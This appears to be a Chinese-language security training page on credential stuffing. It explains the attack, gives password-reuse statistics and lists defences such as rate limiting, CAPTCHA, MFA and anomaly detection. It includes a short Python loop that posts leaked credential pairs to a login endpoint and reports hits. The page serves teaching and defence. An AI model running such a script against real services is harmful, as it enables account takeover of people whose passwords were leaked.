# 撞库攻击 (Credential Stuffing)

撞库攻击利用从其他网站泄露的账号密码，批量尝试登录目标网站。

## 攻击原理

```
泄露凭证库 → 批量尝试 → 密码重复使用 → 账户被盗
```

## 为什么有效？

| 原因 | 数据 |
|---|---|
| 密码重复使用 | 65% 用户多站相同密码 |
| 弱密码 | Top 10 密码占 10% |
| 数据泄露频繁 | 每年数十亿条泄露 |

## 实验一：撞库攻击

### 攻击代码

```python
import requests

leaked_credentials = [
    ('alice@example.com', 'alice123'),
    ('bob@example.com', 'bob456'),
]

for email, password in leaked_credentials:
    r = requests.post(url, data={'email': email, 'password': password})
    if 'success' in r.text:
        print(f'[+] Found: {email}:{password}')
```

## 防护方案

### 登录限流

```javascript
if (ipAttempts[ip] > 5) {
  return res.status(429).json({ error: '请求过于频繁' })
}
```

### 验证码

阻止自动化攻击，要求人工验证。

### 多因素认证 (MFA)

即使密码泄露，没有第二因素也无法登录。

### 异常检测

- 登录频率异常
- 异地登录
- 新设备登录

## 用户侧防护

- ✅ 每个网站使用不同密码
- ✅ 使用密码管理器
- ✅ 启用双因素认证
- ✅ 检查 haveibeenpwned.com

## 开始实验

访问 [撞库攻击实验](/labs/credential) 体验攻击与防护。
